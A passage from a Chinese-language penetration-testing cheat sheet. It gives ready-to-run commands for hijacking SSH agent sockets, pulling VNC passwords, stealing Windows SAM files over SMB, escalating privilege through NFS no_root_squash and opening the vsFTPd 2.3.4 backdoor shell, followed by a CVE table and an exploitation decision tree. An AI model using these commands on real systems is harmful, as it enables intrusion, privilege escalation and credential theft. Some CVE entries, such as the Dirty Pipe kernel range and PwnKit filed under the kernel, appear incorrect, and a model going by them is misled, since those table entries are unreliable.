SSH_AUTH_SOCK=/tmp/ssh-xxx/agent.xxx ssh-add -l
SSH_AUTH_SOCK=/tmp/ssh-xxx/agent.xxx ssh root@localhost
```

### 8.2 OpenVPN 利用

**配置文件分析：**

```bash
# 查找 .ovpn 配置文件中的凭据
grep -r "auth-user-pass" /etc/openvpn/
grep -r "private" /etc/openvpn/
```

### 8.3 RDP/VNC 利用

**VNC 无认证访问：**

```bash
# 常见端口：5900
# 尝试无密码连接

```

**VNC 密码提取：**

```bash
# 查找 VNC 密码文件
find / -name ".vnc" -type d 2>/dev/null
cat ~/.vnc/passwd
# 解密 VNC 密码
python3 -c "import vncrypt; print(vncrypt.decrypt(open('.vnc/passwd','rb').read()))"
```

## 10. 文件共享服务

### 10.1 Samba/SMB 利用

**匿名访问与共享枚举：**

```bash
# 常见端口：139, 445
smbclient -L //<IP> -N
smbclient //<IP>/share -N
smbmap -H <IP> -u null

# 枚举所有共享
enum4linux -a <IP>
```

**已知漏洞：**

```bash
# EternalBlue (MS17-010) - SMBv1
nmap --script smb-vuln-ms17-010 -p 445 <IP>

# SAM 数据库泄露
smbclient //<IP>/C$ -U administrator
get WINDOWS/Repair/SAM
get WINDOWS/system32/config/SAM
```

### 10.2 NFS 利用

**查看和挂载共享：**

```bash
# 常见端口：2049
showmount -e <IP>
mount -t nfs <IP>:/share /mnt/nfs

# 检查 no_root_squash
cat /var/lib/nfs/etab | grep no_root_squash

# 利用 no_root_squash 提权
# 在远程机器上（如果有 NFS 共享可写）：
echo '#!/bin/bash\nchmod +s /bin/bash' > /mnt/nfs/exploit.sh
# 等待 root cron 执行或直接触发
```

### 10.3 FTP 利用

**匿名访问：**

```bash
# 常见端口：21
ftp <IP>
# 匿名登录
# 用户名：anonymous，密码：空或 email

# 自动化枚举
nmap --script ftp-anon,ftp-brute -p 21 <IP>
```

**已知漏洞：**

```bash
# vsFTPd 2.3.4 后门（CVE-2011-2523）
# 连接后发送用户名以 :) 结尾，触发后门在 6200 端口开 shell
ftp <IP>
USER user:)
# 另开终端
nc <IP> 6200
```

## 12. 版本 CVE 快速匹配指南

### 12.1 常见高危 CVE 速查

| 服务 | 版本范围 | CVE | 利用方式 |
|------|---------|-----|---------|
| OpenSSH | < 8.5p1 | CVE-2021-41617 | 权限提升 |
| Apache | 2.4.49 | CVE-2021-41773 | 路径遍历 + RCE |
| Apache | 2.4.50 | CVE-2021-42013 | 路径遍历绕过 |
| Nginx | < 1.21.5 | CVE-2021-23017 | DNS 解析器漏洞 |
| Redis | 4.x/5.x | 主从复制 RCE | 恶意模块加载 |
| PostgreSQL | < 9.6 | CVE-2018-1058 | 搜索路径提权 |
| Polkit | < 0.120 | CVE-2021-4034 (PwnKit) | pkexec 提权 |
| sudo | < 1.9.5p2 | CVE-2021-3156 (Baron Samedit) | 堆溢出提权 |
| systemd | < 247 | CVE-2020-13776 | 参数注入 |
| Linux Kernel | 2.6.22 - 5.9 | Dirty Pipe (CVE-2022-0847) | 管道提权 |
| Linux Kernel | 3.13 - 5.4 | Overlayfs (CVE-2021-3493) | 文件系统提权 |
| Linux Kernel | < 5.8.1 | CVE-2021-4034 (PwnKit) | Polkit 提权 |
| runc | < 1.0-rc6 | CVE-2019-5736 | 容器逃逸 |
| Docker | < 18.09.1 | CVE-2019-5736 | 容器逃逸 |

### 12.2 CVE 验证原则

1. **版本匹配不等于可利用**：需检查补丁状态、发行版 backport
2. **环境依赖**：部分 CVE 需要特定配置才可触发
3. **优先使用本地验证**：优先尝试不依赖网络的本地提权 CVE
4. **记录完整证据链**：版本信息 → CVE 编号 → 利用尝试 → 结果

## 附录：快速利用决策树

```
发现服务版本
  ├── 已知 CVE → 检查补丁状态 → 未打补丁 → 尝试利用
  ├── 配置错误 → 检查默认凭据 → 弱口令/无认证 → 直接访问
  ├── 功能滥用 → 检查危险功能 → UDF/COPY/PUT 等 → 利用内置功能执行命令
  └── 信息泄露 → 检查敏感端口 → 直接读取数据 → 提取凭据/敏感信息
```
